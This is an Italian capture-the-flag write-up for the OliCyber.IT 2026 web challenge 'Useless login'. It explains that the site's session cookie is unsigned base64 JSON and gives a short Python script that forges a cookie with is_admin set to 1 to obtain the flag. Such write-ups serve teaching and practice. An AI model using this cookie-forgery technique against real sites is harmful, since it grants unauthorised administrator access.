# OliCyber.IT 2026 - Selezione Territoriale

## [web] Useless login (377 solves)

Gli admin sono ancora al lavoro per aggiungere contenuti al sito, ma hanno già finito di implementare la parte di autenticazione.

Sito: [https://useless-login.challs.olicyber.it/](https://useless-login.challs.olicyber.it/)

Author: Lorenzo Leonardini <@pianka>

## Panoramica

Il sito si presenta con una schermata di registrazione/login, ma dopo aver effettuato l'accesso non abbiamo nessun contenuto disponibile.

## Soluzione

Guardando il cookie di sessione, notiamo che questo contiene un JSON encodato in base64 contenente le informazioni sull'utente: `username` e `is_admin`.

Possiamo costruire un cookie con il valore di `is_admin` impostato a `1` e accedere così come admin, ottenendo la flag.

## Exploit

```python
#!/usr/bin/env python3

import logging
import os
import requests
import base64

logging.disable()

URL = os.environ.get("URL", "http://todo.challs.todo.it")
if URL.endswith("/"):
    URL = URL[:-1]

res = requests.get(f'{URL}/home', cookies={'session': base64.urlsafe_b64encode(b'{"username":"foo","is_admin":1}').decode()})
print(res.text)
```
